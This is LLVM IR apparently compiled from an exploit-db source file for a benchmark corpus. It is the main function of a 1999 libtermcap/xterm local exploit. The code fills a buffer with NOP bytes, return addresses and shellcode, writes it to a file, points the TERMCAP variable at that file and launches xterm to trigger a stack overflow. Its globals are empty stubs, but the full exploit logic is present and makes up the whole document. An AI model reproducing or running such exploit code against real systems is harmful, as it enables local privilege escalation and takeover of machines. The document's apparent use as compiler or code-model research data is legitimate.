; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19464.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19464.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUF_SIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.1 = private unnamed_addr constant [45 x i8] c"****************************************** \0A\00", align 1
@.str.2 = private unnamed_addr constant [45 x i8] c"* libtermcap xterm exploit, by m0f0 1999 * \0A\00", align 1
@.str.3 = private unnamed_addr constant [46 x i8] c"****************************************** \0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [20 x i8] c"Use : %s [offset] \0A\00", align 1
@RETADDR = common dso_local global i64 0, align 8
@.str.5 = private unnamed_addr constant [24 x i8] c"Return Address = 0x%x \0A\00", align 1
@.str.6 = private unnamed_addr constant [7 x i8] c"xterm|\00", align 1
@POS_SEP = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [3 x i8] c":\\\00", align 1
@POS_RET = common dso_local global i32 0, align 4
@shellcode = common dso_local global i8* null, align 8
@EGG = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@.str.9 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.10 = private unnamed_addr constant [8 x i8] c"TERMCAP\00", align 1
@.str.11 = private unnamed_addr constant [21 x i8] c"/usr/X11R6/bin/xterm\00", align 1
@.str.12 = private unnamed_addr constant [6 x i8] c"xterm\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i64, align 8
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %11 = load i32, i32* @BUF_SIZE, align 4
  %12 = zext i32 %11 to i64
  %13 = call i8* @llvm.stacksave()
  store i8* %13, i8** %7, align 8
  %14 = alloca i8, i64 %12, align 16
  store i64 %12, i64* %8, align 8
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0))
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.1, i64 0, i64 0))
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.2, i64 0, i64 0))
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.3, i64 0, i64 0))
  %19 = load i8**, i8*** %4, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.4, i64 0, i64 0), i8* %21)
  store i64 0, i64* %10, align 8
  %23 = load i32, i32* %3, align 4
  %24 = icmp sgt i32 %23, 1
  br i1 %24, label %25, label %30

25:                                               ; preds = %2
  %26 = load i8**, i8*** %4, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 1
  %28 = load i8*, i8** %27, align 8
  %29 = call i64 @atol(i8* %28)
  store i64 %29, i64* %10, align 8
  br label %30

30:                                               ; preds = %25, %2
  %31 = load i64, i64* @RETADDR, align 8
  %32 = load i64, i64* %10, align 8
  %33 = add nsw i64 %31, %32
  store i64 %33, i64* %9, align 8
  %34 = load i64, i64* %9, align 8
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.5, i64 0, i64 0), i64 %34)
  %36 = load i32, i32* @BUF_SIZE, align 4
  %37 = call i32 @memset(i8* %14, i32 144, i32 %36)
  %38 = load i32, i32* @BUF_SIZE, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds i8, i8* %14, i64 %39
  store i8 0, i8* %40, align 1
  %41 = call i32 @memcpy(i8* %14, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0), i32 6)
  %42 = load i32, i32* @POS_SEP, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds i8, i8* %14, i64 %43
  %45 = call i32 @memcpy(i8* %44, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0), i32 2)
  %46 = load i32, i32* @POS_RET, align 4
  store i32 %46, i32* %5, align 4
  br label %47

47:                                               ; preds = %58, %30
  %48 = load i32, i32* %5, align 4
  %49 = load i32, i32* @POS_SEP, align 4
  %50 = sub nsw i32 %49, 10
  %51 = icmp sle i32 %48, %50
  br i1 %51, label %52, label %61

52:                                               ; preds = %47
  %53 = load i64, i64* %9, align 8
  %54 = load i32, i32* %5, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds i8, i8* %14, i64 %55
  %57 = bitcast i8* %56 to i64*
  store i64 %53, i64* %57, align 8
  br label %58

58:                                               ; preds = %52
  %59 = load i32, i32* %5, align 4
  %60 = add nsw i32 %59, 4
  store i32 %60, i32* %5, align 4
  br label %47

61:                                               ; preds = %47
  store i32 0, i32* %5, align 4
  br label %62

62:                                               ; preds = %77, %61
  %63 = load i32, i32* %5, align 4
  %64 = load i8*, i8** @shellcode, align 8
  %65 = call i32 @strlen(i8* %64)
  %66 = icmp slt i32 %63, %65
  br i1 %66, label %67, label %80

67:                                               ; preds = %62
  %68 = load i8*, i8** @shellcode, align 8
  %69 = load i32, i32* %5, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8, i8* %68, i64 %70
  %72 = load i8, i8* %71, align 1
  %73 = load i32, i32* %5, align 4
  %74 = add nsw i32 %73, 2000
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds i8, i8* %14, i64 %75
  store i8 %72, i8* %76, align 1
  br label %77

77:                                               ; preds = %67
  %78 = load i32, i32* %5, align 4
  %79 = add nsw i32 %78, 1
  store i32 %79, i32* %5, align 4
  br label %62

80:                                               ; preds = %62
  %81 = load i32, i32* @EGG, align 4
  %82 = call i32* @fopen(i32 %81, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.8, i64 0, i64 0))
  store i32* %82, i32** %6, align 8
  %83 = load i32*, i32** %6, align 8
  %84 = call i32 @fprintf(i32* %83, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.9, i64 0, i64 0), i8* %14)
  %85 = load i32*, i32** %6, align 8
  %86 = call i32 @fclose(i32* %85)
  %87 = load i32, i32* @EGG, align 4
  %88 = call i32 @setenv(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.10, i64 0, i64 0), i32 %87, i32 1)
  %89 = call i32 @execl(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.11, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.12, i64 0, i64 0), i32* null)
  %90 = load i8*, i8** %7, align 8
  call void @llvm.stackrestore(i8* %90)
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i64 @atol(i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32* @fopen(i32, i8*) #2

declare dso_local i32 @fprintf(i32*, i8*, i8*) #2

declare dso_local i32 @fclose(i32*) #2

declare dso_local i32 @setenv(i8*, i32, i32) #2

declare dso_local i32 @execl(i8*, i8*, i32*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
